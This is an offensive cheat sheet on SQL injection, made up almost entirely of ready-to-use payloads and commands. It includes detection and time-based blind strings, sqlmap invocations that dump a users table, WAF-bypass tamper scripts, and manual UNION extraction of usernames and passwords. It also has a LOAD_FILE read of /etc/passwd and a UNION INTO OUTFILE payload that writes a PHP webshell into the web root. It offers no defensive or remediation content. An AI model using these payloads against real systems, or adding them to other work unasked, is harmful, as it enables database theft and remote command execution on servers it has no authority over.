# SQL Injection (SQLi)

**CWE:** CWE-89 | **OWASP:** A03:2021

---

## Types

| Type | Detection Method |
|------|-----------------|
| Error-based | Error messages in response |
| Union-based | UNION SELECT to extract data |
| Boolean-blind | True/False response differences |
| Time-based blind | SLEEP/WAITFOR delays |
| Out-of-band | DNS/HTTP callbacks |

---

## Quick Detection

```sql
-- Classic
'
''
`
')
"))

-- Boolean
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2

-- Error-based
' OR 1=CONVERT(int, (SELECT @@version))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--

-- Time-based
1' AND SLEEP(5)--                    # MySQL
1'; WAITFOR DELAY '0:0:5'--          # MSSQL
1' AND 1=1 pg_sleep(5)--             # PostgreSQL
1' AND 1=(SELECT 1 FROM pg_sleep(5))--
```

---

## Automated Testing

```bash
# SQLMap
sqlmap -u "https://target.com/page?id=1" --batch --dbs
sqlmap -u "https://target.com/page?id=1" --batch -D dbname --tables
sqlmap -u "https://target.com/page?id=1" --batch -D dbname -T users --dump

# POST request
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=test" \
  --batch --level 3 --risk 2

# With cookies (authenticated)
sqlmap -u "https://target.com/api?id=1" \
  --cookie="session=TOKEN" --batch

# Tamper scripts (WAF bypass)
sqlmap -u "https://target.com?id=1" --tamper=space2comment,between --batch

# Ghauri (modern alternative)
ghauri -u "https://target.com?id=1" --dbs --batch
```

---

## Manual Union Extraction

```sql
-- Step 1: Find column count
ORDER BY 1--
ORDER BY 2--
-- (increment until error)

-- Step 2: Find printable column
UNION SELECT NULL, NULL, NULL--
UNION SELECT 'a', NULL, NULL--

-- Step 3: Extract data
UNION SELECT username, password, NULL FROM users--

-- MySQL version/db
UNION SELECT @@version, @@datadir, user()--

-- File read (MySQL)
UNION SELECT LOAD_FILE('/etc/passwd'), NULL, NULL--

-- Write webshell (MySQL)
UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL, NULL
  INTO OUTFILE '/var/www/html/shell.php'--
```

---

## Database Fingerprinting

| DB | Fingerprint Query |
|----|-------------------|
| MySQL | `SELECT @@version` |
| MSSQL | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| Oracle | `SELECT * FROM v$version` |
| SQLite | `SELECT sqlite_version()` |

---

## WAF Bypass Techniques

```sql
-- Space alternatives
SELECT/**/username/**/FROM/**/users
SEL%00ECT username FROM users

-- Case mixing
SeLeCt UsErNaMe FrOm UsErS

-- Comment injection
SE/**/LECT

-- URL encoding
%53%45%4C%45%43%54

-- Double URL encoding
%2553%2545%254C%2545%2543%2554
```
